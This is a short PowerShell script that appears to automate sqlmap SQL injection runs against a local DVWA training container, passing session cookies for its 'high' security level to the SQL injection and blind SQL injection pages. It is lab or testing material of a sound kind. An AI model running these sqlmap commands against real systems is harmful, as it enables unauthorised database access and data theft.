# Read configuration
$config = Get-Content (Join-Path $PSScriptRoot "..\config.json") | ConvertFrom-Json

# Environment
$target = "dvwa"
$sqlmap_path = [System.IO.Path]::GetFullPath((Join-Path $PSScriptRoot $config.tools.sqlmap))
$output_dir = Join-Path $PSScriptRoot $config.output_raw

$request1 = Join-Path $PSScriptRoot $config.targets.$target.request1
$request2 = Join-Path $PSScriptRoot $config.targets.$target.request2

$url_sqli = $config.environment.dvwa_docker + "/vulnerabilities/sqli"
$url_blind = $config.environment.dvwa_docker + "/vulnerabilities/sqli_blind"

$phpsessid = $config.targets.$target.phpsessid
$cookie_high = "security=high; PHPSESSID={0}" -f $phpsessid

$cookie_id = "id=1; " + $cookie_high

# High security sqli

python $sqlmap_path -r "$request1"  --cookie="$cookie_high" --second-url="$url_sqli" -p id --level 3 --dbms="MySQL" --batch --output-dir="$output_dir\dvwa_high"

# High security sqli (blind)

python $sqlmap_path -u "$url_blind" --cookie="$cookie_id" -p id --level 3 --dbms="MySQL" --batch --output-dir="$output_dir\dvwa_high"

